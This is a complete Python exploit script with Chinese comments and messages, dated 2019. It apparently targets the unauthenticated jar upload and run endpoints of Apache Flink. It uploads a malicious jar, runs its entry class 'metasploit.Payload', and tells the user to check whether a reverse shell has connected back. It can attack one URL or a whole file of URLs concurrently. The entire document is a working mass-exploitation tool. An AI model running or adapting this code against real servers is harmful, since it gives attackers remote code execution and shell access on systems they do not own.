#@author:九世
#@time:2019/11/13
#@file:exp.py

from gevent import monkey;monkey.patch_all()
import asyncio
import requests
import optparse
import os
import gevent
from multiprocessing import Process
from requests_toolbelt.multipart.encoder import MultipartEncoder
from colorama import Fore,init

init(wrap=True)
class Upload(object):
    def __init__(self):
        self.ybs = []
        self.calc2 = 0
        self.calc = 0
        self.djcs=[]
        self.xcs=[]
        usage = 'python exp.py -u [url] -j [jar] -c [class]/python exp.py -f [url] -j [jar] -c [class]'
        parser = optparse.OptionParser(usage)
        parser.add_option('-u', dest='url', help='单个url测试')
        parser.add_option('-j', dest='jar', help='设置恶意jar')
        parser.add_option('-c', dest='jar_class', help='jar包里的jar_class')
        parser.add_option('-f', dest='file', help='批量检测')
        (options, args) = parser.parse_args()
        if options.url and options.jar and options.jar_class:
            self.requstexp(options.url,options.jar,options.jar_class)
        elif options.file and options.jar and options.jar_class:
            loop = asyncio.get_event_loop()
            tk = loop.create_task(self.yb(options.file,options.jar,options.jar_class))
            loop.run_until_complete(tk)
        else:
            parser.print_help()
            exit()



    def requstexp(self,url,jar,jar_class):
        self.headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0'}
        self.files={'file':('haq.jar',open(jar,'rb'),'application/octet-stream')}
        self.path='/jars/upload'
        self.class_=jar_class
        self.path2='/{jar}/run?entry-class={jar_class}'
        self.proxies={'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}
        yuan=url
        filename=''
        try:
            url=url+self.path
            rqt=requests.post(url=url,headers=self.headers,files=self.files)
            if 'filename' in rqt.text:
                filename+=str(rqt.json()['filename'])
                print(Fore.BLUE+'[+] '+Fore.WHITE+'jar上传成功:{}'.format(filename))
            else:
                print(Fore.RED+'[-] '+Fore.WHITE+'jar上传失败，不存在任意jar上传漏洞，url:{}'.format(rqt.url))

            url2=yuan+self.path2.format(jar='jars/'+filename.split('/')[-1],jar_class=self.class_)
            rbt=requests.post(url=url2,headers=self.headers,json={"entryClass":"metasploit.Payload"},proxies=self.proxies)
            if 'System.err' in rbt.text:
                print(Fore.BLUE+'[+] '+Fore.WHITE+'已成功执行jar包，url:{} 检查是否反弹回shell'.format(rbt.url))
            else:
                print(Fore.RED + '[-] ' + Fore.WHITE + 'jar包执行失败，url:{}'.format(rbt.url))
        except Exception as r:
            print(Fore.RED+'[-] '+Fore.WHITE+'Eror {}'.format(r))

    def xc(self,rw,jar,jar_class):
        for g in rw:
            self.xcs.append(gevent.spawn(self.requstexp,g,jar,jar_class))

        gevent.joinall(self.xcs)
        self.xcs.clear()

    def djc(self,jar,jar_class):
        for data in self.ybs:
            if self.calc==100:
                p=Process(target=self.xc,args=(self.djcs,jar,jar_class))
                p.start()
                calc=0
                self.djcs.clear()

            self.djcs.append(data)
            self.calc+=1

        if len(self.djcs)>0:
            p = Process(target=self.xc, args=(self.djcs,jar,jar_class))
            p.start()
            calc = 0
            self.djcs.clear()

    async def yb(self,file,jar,jar_class):
        if os.path.exists(file):
            print(Fore.BLUE+'[+] '+Fore.WHITE+'{}文件存在'.format(file))
        else:
            print(Fore.RED+'[-] '+Fore.WHITE+'{}不存在'.format(file))
            exit()

        dk=open(file,'r',encoding='utf-8')
        for r in dk.readlines():
            data="".join(r.split('\n'))
            if self.calc2==100:
                self.djc(jar,jar_class)
                self.ybs.clear()
                self.calc2=0

            self.ybs.append(data)
            self.calc2+=1

        if len(self.ybs)>0:
            self.djc(jar,jar_class)
            self.ybs.clear()
            self.calc2 = 0

if __name__ == '__main__':
    obj=Upload()